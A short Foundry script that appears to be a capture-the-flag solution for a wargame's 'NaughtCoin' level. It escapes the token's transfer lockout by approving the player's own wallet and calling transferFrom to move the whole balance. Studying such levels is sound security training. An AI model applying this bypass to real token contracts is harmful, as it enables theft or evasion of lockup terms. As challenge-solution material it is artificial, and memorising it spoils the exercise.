// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel15.sol";
import "forge-std/Script.sol";

contract POC is Script {
    NaughtCoin level15 = NaughtCoin(0x44F8999768090e3a864301bD6befD079539b5E74);

    function run() external {
        vm.startBroadcast();

        address myWallet = 0x52D6eFC2994ebd93c883b5dA1d32a6cae6bE105B;
        uint walletBal = level15.balanceOf(myWallet);
        console.log("My wallet balance is: ", walletBal);

        //approve the wallet with amount to spend
        level15.approve(myWallet, walletBal);
        level15.transferFrom(myWallet, address(level15), walletBal);

        console.log("New balance is: ", level15.balanceOf(myWallet));
    }
}
